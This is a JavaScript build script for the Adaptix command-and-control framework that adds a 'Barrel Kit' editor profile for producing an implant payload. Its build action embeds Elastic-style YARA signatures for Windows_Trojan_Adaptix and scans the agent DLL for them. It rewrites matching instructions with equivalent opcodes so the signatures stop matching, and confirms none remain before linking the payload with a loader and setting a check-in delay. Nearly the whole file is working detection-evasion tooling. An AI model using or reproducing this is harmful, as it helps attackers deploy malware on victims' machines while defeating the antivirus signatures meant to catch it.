let profileId = "barrel-kit";
let kitRoot = ax.script_dir().replace(/\\/g, "/");

while (kitRoot.length > 1 && kitRoot.endsWith("/"))
    kitRoot = kitRoot.slice(0, -1);

let defaultOutput = kitRoot + "/output/agent.x64.bin";
let panelScript = `
function GeneratePanel() {
    let kitEdit = form.create_textline(${JSON.stringify(kitRoot)});
    let kitButton = form.create_button("...");
    let dllEdit = form.create_textline("");
    let dllButton = form.create_button("...");
    let outputEdit = form.create_textline(${JSON.stringify(defaultOutput)});
    let outputButton = form.create_button("...");
    let initialDelaySpin = form.create_spin();
    initialDelaySpin.setRange(0, 86400);
    initialDelaySpin.setValue(0);

    form.connect(kitButton, "clicked", function () {
        let path = ax.prompt_open_dir("Select Barrel Kit directory");
        if (path) {
            kitEdit.setText(path);
            outputEdit.setText(path + "/output/agent.x64.bin");
        }
    });

    form.connect(dllButton, "clicked", function () {
        let path = ax.prompt_open_file(
            "Select stock Adaptix x64 DLL",
            "DLL files (*.dll);;All files (*)"
        );
        if (path)
            dllEdit.setText(path);
    });

    form.connect(outputButton, "clicked", function () {
        let path = ax.prompt_save_file(
            outputEdit.text(),
            "Save Barrel Kit payload",
            "Binary files (*.bin);;All files (*)"
        );
        if (path)
            outputEdit.setText(path);
    });

    let grid = form.create_gridlayout();
    grid.addWidget(form.create_label("Kit:"), 0, 0, 1, 1);
    grid.addWidget(kitEdit, 0, 1, 1, 1);
    grid.addWidget(kitButton, 0, 2, 1, 1);
    grid.addWidget(form.create_label("Agent DLL:"), 1, 0, 1, 1);
    grid.addWidget(dllEdit, 1, 1, 1, 1);
    grid.addWidget(dllButton, 1, 2, 1, 1);
    grid.addWidget(form.create_label("Output:"), 2, 0, 1, 1);
    grid.addWidget(outputEdit, 2, 1, 1, 1);
    grid.addWidget(outputButton, 2, 2, 1, 1);
    grid.addWidget(form.create_label("Check-in Delay:"), 3, 0, 1, 1);
    grid.addWidget(initialDelaySpin, 3, 1, 1, 1);
    grid.addWidget(form.create_label("seconds"), 3, 2, 1, 1);

    let panel = form.create_panel();
    panel.setLayout(grid);

    let container = form.create_container();
    container.put("kit", kitEdit);
    container.put("dll", dllEdit);
    container.put("output", outputEdit);
    container.put("initial_delay", initialDelaySpin);

    return {
        ui_panel: panel,
        ui_container: container
    };
}
`;

let buildAction = `
function cleanPath(value) {
    let path = String(value || "").trim();
    path = path.split(String.fromCharCode(92)).join("/");
    while (path.length > 1 && path.endsWith("/"))
        path = path.slice(0, -1);
    return path;
}

function dirname(path) {
    let index = path.lastIndexOf("/");
    return index > 0 ? path.slice(0, index) : ".";
}

function shellQuote(value) {
    let single = String.fromCharCode(39);
    let double = String.fromCharCode(34);
    let escaped = single + double + single + double + single;
    return single + String(value).split(single).join(escaped) + single;
}

function splitWords(value) {
    let words = [];
    let word = "";
    for (let index = 0; index < value.length; index++) {
        let code = value.charCodeAt(index);
        let whitespace = code === 9 || code === 10 || code === 13 || code === 32;
        if (whitespace) {
            if (word) {
                words.push(word);
                word = "";
            }
        } else {
            word += value[index];
        }
    }
    if (word)
        words.push(word);
    return words;
}

function readBytes(path) {
    let size = ax.file_size(path);
    if (size < 0)
        throw new Error(
            "cannot access agent DLL; check AxScript file-read permission and sandbox directory"
        );
    if (size === 0)
        throw new Error("agent DLL is missing or empty: " + path);

    let raw = ax.file_read(path);
    let bytes;
    try {
        bytes = new Uint8Array(raw);
    } catch (error) {
        throw new Error("cannot read agent DLL bytes: " + String(error));
    }
    if (bytes.length !== size)
        throw new Error("agent DLL read was incomplete: " + path);
    return bytes;
}

function hexPattern(expression) {
    let tokens = splitWords(expression);
    let pattern = [];
    for (let index = 0; index < tokens.length; index++) {
        let token = tokens[index];
        if (token === "??") {
            pattern.push(-1);
        } else {
            let value = parseInt(token, 16);
            if (token.length !== 2 || isNaN(value))
                throw new Error("invalid embedded YARA token: " + token);
            pattern.push(value);
        }
    }
    return pattern;
}

function embeddedYaraPatterns() {
    return {
        "Windows_Trojan_Adaptix_2779784c:$a1": hexPattern(
            "48 81 EC A8 01 00 00 48 8B 84 24 C0 01 00 00 48 C7 00 00 00 00 00 48 8B 84 24 C0 01 00 00 48 C7 40 08 00 00 00 00 48 8B 84 24 C0 01 00 00 48 C7 40 10 00 00 00 00 48 8B 84 24 C0 01 00 00 48 C7"
        ),
        "Windows_Trojan_Adaptix_2779784c:$a2": hexPattern(
            "48 83 EC 58 48 8B 4C 24 70 E8 ?? ?? ?? ?? 89 44 24 38 C7 44 24 34 00 00 00 00 48 8D 54 24 34 48 8B 4C 24 70 E8 ?? ?? ?? ?? 48 89 44 24 40 48 8B 4C 24 70 E8 ?? ?? ?? ?? 66 89 44 24 30"
        ),
        "Windows_Trojan_Adaptix_b2cda978:$a1": hexPattern(
            "48 89 03 8B 45 EC 48 98 48 8D 14 C5 00 00 00 00 48 8B 45 20 48 01 D0 48 8B 00 48 85 C0 75 15 48 8B 45 E0 8B 40 10 85 C0 74 0A B8 00 00 00 00"
        ),
        "Windows_Trojan_Adaptix_b2cda978:$a2": hexPattern(
            "48 89 45 D0 48 8B 4D 10 E8 4C 9F 00 00 89 C2 48 8D 85 C0 FB FF FF 49 89 D0 BA 00 00 00 00 48 89 C1 E8 D5 DE FF FF 48 83 7D D0 00 74 11 8B 55 E8 48 8B 45 D0 48 89 C1"
        ),
        "Windows_Trojan_Adaptix_b2cda978:$a3": hexPattern(
            "8B 53 54 48 89 C6 31 C0 48 39 C2 74 0B 8A 0C 07 88 0C 06 48 FF C0 EB F0 0F B7 43 14 0F B7 4B 06 48 8D 44 03 18 48 83 E9 01 72 2C 44 8B 40 0C 44 8B 48 14 31 D2 44 8B 50 10 49 01 F0 49 01 F9 49"
        ),
        "Windows_Trojan_Adaptix_b2cda978:$a4": hexPattern(
            "48 89 45 E0 48 83 7D E0 00 75 17 41 B8 00 00 00 00 BA 00 00 00 00 B9 05 01 00 00 E8 27 E8 FF FF EB 63 4C 8B 4D D0 4C 8D 85 00 FF FF FF 48 8B 55 D8 48 8B 45 20 48 8B 4D E0 48 89 4C 24 20 48 89"
        ),
        "Windows_Trojan_Adaptix_b2cda978:$a5": hexPattern(
            "48 83 EC 10 89 4D 10 C7 ?? ?? ?? ?? ?? ?? 8B 45 10 89 45 F8 48 8D 45 FC 0F B6 00 3C DD 75 37 48 8D 45 F8 0F B6 55 13 88 10 48 8D 45 F8 48 83 C0 01 0F B6 55 12 88 10 48 8D 45 F8 48 83 C0 02"
        )
    };
}

function findMatches(data, pattern) {
    let matches = [];
    if (!pattern.length || data.length < pattern.length)
        return matches;

    let anchor = 0;
    while (anchor < pattern.length && pattern[anchor] < 0)
        anchor++;
    if (anchor === pattern.length)
        throw new Error("all-wildcard YARA patterns are unsupported");

    for (let offset = 0; offset <= data.length - pattern.length; offset++) {
        if (data[offset + anchor] !== pattern[anchor])
            continue;
        let matched = true;
        for (let index = 0; index < pattern.length; index++) {
            if (pattern[index] >= 0 && data[offset + index] !== pattern[index]) {
                matched = false;
                break;
            }
        }
        if (matched)
            matches.push(offset);
    }
    return matches;
}

function replaceAnchor(data, matchOffset, patternWidth, before, after) {
    if (before.length !== after.length)
        throw new Error("replacement length must not change");

    let found = -1;
    for (let relative = 0; relative <= patternWidth - before.length; relative++) {
        let matched = true;
        for (let index = 0; index < before.length; index++) {
            if (data[matchOffset + relative + index] !== before[index]) {
                matched = false;
                break;
            }
        }
        if (!matched)
            continue;
        if (found >= 0)
            throw new Error("replacement anchor is not unique");
        found = relative;
    }

    if (found < 0)
        throw new Error("replacement anchor not found");
    let patchOffset = matchOffset + found;
    for (let index = 0; index < after.length; index++)
        data[patchOffset + index] = after[index];
    return patchOffset;
}

function scrubDll(inputPath, outputPath) {
    try {
        let source = readBytes(inputPath);
        if (source.length < 2 || source[0] !== 77 || source[1] !== 90)
            throw new Error("cannot read a valid PE agent DLL");

        let patterns = embeddedYaraPatterns();
        let data = new Uint8Array(source.length);
        for (let index = 0; index < source.length; index++)
            data[index] = source[index];

        let patches = [
            {
                name: "Windows_Trojan_Adaptix_b2cda978:$a1",
                before: [72, 133, 192],
                after: [72, 9, 192]
            },
            {
                name: "Windows_Trojan_Adaptix_b2cda978:$a5",
                before: [72, 131, 192, 1],
                after: [72, 141, 64, 1]
            }
        ];
        let patched = 0;

        for (let patchIndex = 0; patchIndex < patches.length; patchIndex++) {
            let patch = patches[patchIndex];
            let pattern = patterns[patch.name];
            if (!pattern)
                throw new Error("expected YARA pattern missing: " + patch.name);
            let matches = findMatches(data, pattern);
            for (let matchIndex = 0; matchIndex < matches.length; matchIndex++) {
                let offset = replaceAnchor(
                    data,
                    matches[matchIndex],
                    pattern.length,
                    patch.before,
                    patch.after
                );
                editor.log("YARA scrub " + patch.name + " at 0x" + offset.toString(16));
                patched++;
            }
        }

        let remaining = [];
        let names = Object.keys(patterns);
        for (let nameIndex = 0; nameIndex < names.length; nameIndex++) {
            let name = names[nameIndex];
            let matches = findMatches(data, patterns[name]);
            if (matches.length)
                remaining.push(name + "@0x" + matches[0].toString(16));
        }
        if (remaining.length)
            throw new Error("unhandled YARA matches: " + remaining.join(", "));
        if (!ax.file_write(outputPath, data.buffer))
            throw new Error(
                "cannot write scrubbed DLL; check AxScript file-write permission and sandbox directory"
            );

        return { ok: true, count: patched };
    } catch (error) {
        return { ok: false, error: String(error) };
    }
}

let params = editor.get_panel_data();
let kit = cleanPath(params.kit);
let dll = cleanPath(params.dll);
let output = cleanPath(params.output);
let initialDelay = parseInt(String(params.initial_delay || 0), 10);
let invalidDelay = isNaN(initialDelay) || initialDelay < 0 || initialDelay > 86400;

if (!kit || !dll || !output) {
    editor.log("Set the kit directory, agent DLL, and output path.");
} else if (invalidDelay) {
    editor.log("Initial check-in delay must be between 0 and 86400 seconds.");
} else if (editor.job_running("barrel-kit-build")) {
    editor.log("Barrel Kit build is already running.");
} else {
    let scrubbedDll = dirname(output) + "/agent.x64.scrubbed.dll";
    let scrub = scrubDll(dll, scrubbedDll);
    if (!scrub.ok) {
        editor.log("YARA scrub failed: " + scrub.error);
    } else {
        editor.log("YARA scrubbed " + scrub.count + " match(es).");
        let commands = [
            "set -eu",
            "command -v make >/dev/null 2>&1 || { echo '[-] make not found in PATH' >&2; exit 1; }",
            "command -v java >/dev/null 2>&1 || { echo '[-] java not found in PATH' >&2; exit 1; }",
            "command -v x86_64-w64-mingw32-gcc >/dev/null 2>&1 || { echo '[-] MinGW GCC not found in PATH' >&2; exit 1; }",
            "command -v x86_64-w64-mingw32-objcopy >/dev/null 2>&1 || { echo '[-] MinGW objcopy not found in PATH' >&2; exit 1; }",
            "test -f " + shellQuote(kit + "/Makefile") + " || { echo '[-] invalid Barrel Kit directory' >&2; exit 1; }",
            "test -f " + shellQuote(kit + "/loader.spec") + " || { echo '[-] loader.spec not found' >&2; exit 1; }",
            "test -f " + shellQuote(kit + "/pico.spec") + " || { echo '[-] pico.spec not found' >&2; exit 1; }",
            "test -f " + shellQuote(kit + "/crystalpalace.jar") + " || { echo '[-] crystalpalace.jar not found' >&2; exit 1; }",
            "test -f " + shellQuote(kit + "/libtcg.x64.zip") + " || { echo '[-] libtcg.x64.zip not found' >&2; exit 1; }",
            "mkdir -p " + shellQuote(dirname(output)),
            "make INITIAL_CHECKIN_DELAY_SECONDS=" + String(initialDelay) + " clean all",
            "rm -f " + shellQuote(output),
            "java -jar " + shellQuote(kit + "/crystalpalace.jar")
                + " link " + shellQuote(kit + "/loader.spec")
                + " " + shellQuote(scrubbedDll)
                + " " + shellQuote(output),
            "test -s " + shellQuote(output),
            "echo " + shellQuote("[+] Barrel Kit payload: " + output)
        ];

        if (initialDelay > 0)
            editor.log("Initial check-in delay: " + String(initialDelay) + " seconds.");
        else
            editor.log("Initial check-in delay: disabled.");
        editor.log("Starting Barrel Kit build...");
        editor.job_start(commands.join(" && "), {
            id: "barrel-kit-build",
            cwd: kit
        });
    }
}
`;

let status = ax.editor_profile_upsert({
    id: profileId,
    name: "Barrel Kit",
    language: "plain",
    persist: true,
    force: true,
    panel_script: panelScript,
    toolbar: {
        newFile: false,
        openFile: true,
        openFolder: true,
        save: false,
        explorer: true,
        buildLog: true,
        minimap: false,
        wordWrap: true,
        panel: "axscript"
    },
    actions: [
        {
            id: "build",
            label: "Build Barrel Kit",
            icon: ":/icons/build",
            script: buildAction
        },
        {
            id: "stop",
            label: "Stop build",
            icon: ":/icons/stop",
            script: "editor.job_stop(\"barrel-kit-build\");"
        }
    ]
});

if (status.startsWith("error")) {
    ax.log_error("Barrel Kit profile: " + status);
} else {
    ax.log("Barrel Kit profile: " + status);
    ax.open_code_editor({
        profiles: [profileId],
        profile: profileId
    });
}
